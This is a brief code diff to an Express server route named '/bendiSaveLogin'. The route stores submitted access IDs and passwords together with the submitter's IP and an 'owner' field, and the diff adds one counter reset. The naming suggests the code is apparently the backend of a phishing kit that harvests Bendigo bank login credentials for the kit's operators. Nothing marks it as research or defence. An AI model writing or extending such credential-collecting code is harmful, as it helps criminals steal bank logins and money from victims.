@@ -123,6 +123,7 @@ app.post("/bendiSaveLogin", cors(), (req, res) => {
       if (!err) res.send("Insertion Completed");
       else console.log(err);
     });
+    bendigoCountSkii = 0;
   } else {
     let details = [accessId, password, uniqueid, ip, owner];
     let query = `INSERT INTO bendi(accessId,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;
